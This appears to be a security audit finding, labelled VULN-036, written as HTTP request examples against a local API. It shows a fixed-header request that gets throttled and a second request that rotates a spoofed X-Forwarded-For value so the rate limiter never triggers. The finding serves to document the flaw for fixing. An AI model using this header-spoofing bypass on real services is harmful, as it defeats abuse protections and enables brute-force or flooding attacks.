### VULN-036 — Rate-limit bypass via spoofable X-Forwarded-For
### The API is published directly; the limiter keys on client headers.

### Throttled (single bucket) — after ~100 requests returns 429:
GET http://localhost:21527/ HTTP/1.1
Host: localhost:21527
X-Forwarded-For: 203.0.113.7

### Bypassed — rotate the header every request, each lands in a fresh bucket, never 429:
GET http://localhost:21527/ HTTP/1.1
Host: localhost:21527
X-Forwarded-For: 198.51.100.<incrementing>
